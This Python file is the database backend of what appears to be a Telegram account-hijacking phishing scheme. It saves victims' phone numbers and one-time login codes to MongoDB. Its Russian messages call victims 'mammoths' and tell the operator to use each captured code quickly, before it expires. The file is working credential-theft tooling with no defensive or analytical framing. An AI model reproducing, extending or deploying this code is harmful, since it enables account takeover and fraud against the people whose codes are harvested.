from pymongo import MongoClient


class Mongodb:
    @staticmethod
    def push_tg_dannie(user_id, phone_number):
        cluster = MongoClient("mongodb://localhost:27017/")
        db = cluster["telegram_accs"]
        collections = db["accaunts"]

        user_data = {
            "Номер телефона аккаунта": phone_number,
            'Telegram_id': user_id,

        }

        collections.insert_one(user_data)
        print(f"Мамонт ввел номер телефона!")

    @staticmethod
    def push_tg_code(user_id, confirm_code):
        cluster = MongoClient("mongodb://localhost:27017/")
        db = cluster["telegram_accs"]
        collections = db["accaunts"]
        query = {"Telegram_id": user_id}
        user = collections.find_one(query)
        if user:
            collections.update_one(
                query,
                {"$set": {"Telegram код для входа": confirm_code}}
            )
            print(f"Мамонт ввел код! Скорее обработай нового мамонта, пока код для тг еще активен!")
        else:
            print(f"Ошибка, срочно к sh1ro")
